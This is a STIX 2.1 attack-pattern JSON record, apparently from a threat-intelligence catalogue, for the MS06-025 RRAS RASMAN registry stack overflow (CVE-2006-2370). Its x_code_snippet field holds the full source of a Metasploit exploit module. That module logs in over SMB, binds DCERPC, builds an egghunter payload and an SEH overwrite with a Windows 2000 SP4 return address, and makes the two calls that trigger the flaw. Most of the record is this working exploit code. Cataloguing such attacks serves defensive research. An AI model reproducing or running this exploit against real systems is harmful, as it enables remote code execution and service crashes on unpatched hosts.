{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7a62396d-5eb3-4ce7-b7a8-76aa3e9ecd1b",
    "created": "2024-08-14T16:56:33.852543Z",
    "modified": "2024-08-14T16:56:33.852548Z",
    "name": "MS06-025 Microsoft RRAS Service RASMAN Registry Overflow",
    "description": " This module exploits a registry-based stack buffer overflow in the Windows Routing and Remote Access Service. Since the service is hosted inside svchost.exe a failed exploit attempt can cause other system services to fail as well. A valid username and password is required to exploit this flaw on Windows 2000. When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'. Exploiting this flaw involves two distinct steps - creating the registry key and then triggering an overwrite based on a read of this key. Once the key is created, it cannot be recreated. This means that for any given system, you only get one chance to exploit this flaw. Picking the wrong target will require a manual removal of the following registry key before you can try again: HKEY_USERS\\\\.DEFAULT\\\\Software\\\\Microsoft\\\\RAS Phonebook ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms06_025_rasmans_reg.rb",
            "external_id": "ms06_025_rasmans_reg.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2370"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Egghunter\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-025 Microsoft RRAS Service RASMAN Registry Overflow',\n      'Description'    => %q{\n          This module exploits a registry-based stack buffer overflow in the Windows Routing\n        and Remote Access Service. Since the service is hosted inside svchost.exe,\n        a failed exploit attempt can cause other system services to fail as well.\n        A valid username and password is required to exploit this flaw on Windows 2000.\n        When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'.\n        Exploiting this flaw involves two distinct steps - creating the registry key\n        and then triggering an overwrite based on a read of this key. Once the key is\n        created, it cannot be recreated. This means that for any given system, you\n        only get one chance to exploit this flaw. Picking the wrong target will require\n        a manual removal of the following registry key before you can try again:\n        HKEY_USERS\\\\.DEFAULT\\\\Software\\\\Microsoft\\\\RAS Phonebook\n      },\n      'Author'         => [ 'pusscat', 'hdm' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-2370' ],\n          [ 'OSVDB', '26437' ],\n          [ 'BID', '18325' ],\n          [ 'MSB', 'MS06-025' ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\\x00\\x2c\\x5c\\x2e\\x3a\\x24\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 SP4', { 'Ret' => 0x750217ae } ],  # call esi\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-06-13'))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"Rawr.\", 'router']),\n      ])\n  end\n\n  # Post authentication bugs are rarely useful during automation\n  def autofilter\n    false\n  end\n\n  def exploit\n    connect()\n    smb_login()\n    print_status(\"Trying target #{target.name}...\")\n\n    # Generate the egghunter payload\n    hunter = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n    egg    = hunter[1]\n\n    # Pick a \"filler\" character that we know doesn't get mangled\n    # by the wide string conversion routines\n    filset = \"\\xc1\\xff\\x67\\x1b\\xd3\\xa3\\xe7\"\n    fil    = filset[ rand(filset.length) ].chr\n\n    # Bind to the actual DCERPC interface\n    handle = dcerpc_handle('20610036-fa22-11cf-9823-00a0c911e5df', '1.0', 'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"])\n    print_status(\"Binding to #{handle}\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle}\")\n\n    # Add giant blocks of guard data before and after the egg\n    eggdata  =\n      fil * 1024 +\n      egg +\n      fil * 1024\n\n    # Place the egghunter where ESI happens to point\n    bof = (fil * 178)\n    bof[84, hunter[0].length] = hunter[0]\n\n    # Overwrite the SEH ptr, even though ESP is smashed\n    # The handle after the ret must be an invalid address\n    pat =\n      (fil * 886) +\n      NDR.long(target.ret) +\n      (fil * 3) + \"\\xc0\" +\n      bof\n\n    type2 =\n      NDR.string( (fil * 1024) + \"\\x00\" ) +\n      NDR.string( pat + \"\\x00\" ) +\n      NDR.string( (fil * 4096) + \"\\x00\" ) +\n        NDR.long(rand(0xffffffff)) +\n        NDR.long(rand(0xffffffff))\n\n    type1 =\n      NDR.long(rand(0xffffffff)) + # OperatorDial\n      NDR.long(rand(0xffffffff)) + # PreviewPhoneNumber\n      NDR.long(rand(0xffffffff)) + # UseLocation\n      NDR.long(rand(0xffffffff)) + # ShowLights\n      NDR.long(rand(0xffffffff)) + # ShowConnectStatus\n      NDR.long(rand(0xffffffff)) + # CloseOnDial\n      NDR.long(rand(0xffffffff)) + # AllowLogonPhonebookEdits\n      NDR.long(rand(0xffffffff)) + # AllowLogonLocationEdits\n      NDR.long(rand(0xffffffff)) + # SkipConnectComplete\n      NDR.long(rand(0xffffffff)) + # NewEntryWizard\n      NDR.long(rand(0xffffffff)) + # RedialAttempts\n      NDR.long(rand(0xffffffff)) + # RedialSeconds\n      NDR.long(rand(0xffffffff)) + # IdleHangUpSeconds\n      NDR.long(rand(0xffffffff)) + # RedialOnLinkFailure\n      NDR.long(rand(0xffffffff)) + # PopupOnTopWhenRedialing\n      NDR.long(rand(0xffffffff)) + # ExpandAutoDialQuery\n      NDR.long(rand(0xffffffff)) + # CallbackMode\n\n      NDR.long(0x45) + type2 +     # Parsed by CallbackListFromRpc\n      NDR.wstring(\"\\x00\" * 129)  +\n      NDR.long(rand(0xffffffff)) +\n      NDR.wstring(\"\\x00\" * 520)  +\n      NDR.wstring(\"\\x00\" * 520)  +\n\n      NDR.long(rand(0xffffffff)) +\n      NDR.long(rand(0xffffffff)) +\n      NDR.long(rand(0xffffffff)) +\n      NDR.long(rand(0xffffffff)) +\n      NDR.long(rand(0xffffffff)) +\n      NDR.long(rand(0xffffffff)) +\n      NDR.long(rand(0xffffffff)) +\n      NDR.long(rand(0xffffffff)) +\n\n      NDR.string(\"\\x00\" * 514) +\n\n      NDR.long(rand(0xffffffff)) +\n        NDR.long(rand(0xffffffff))\n\n    stubdata =\n      type1 +\n      NDR.long(rand(0xffffffff)) +\n      eggdata\n\n    print_status('Stub is ' + stubdata.length.to_s + ' bytes long.')\n\n    begin\n      print_status('Creating the malicious registry key...')\n      response = dcerpc.call(0xA, stubdata)\n\n      print_status('Attempting to trigger the base pointer overwrite...')\n      response = dcerpc.call(0xA, stubdata)\n\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-06-13",
    "x_mitre_platforms": [
        "win'"
    ]
}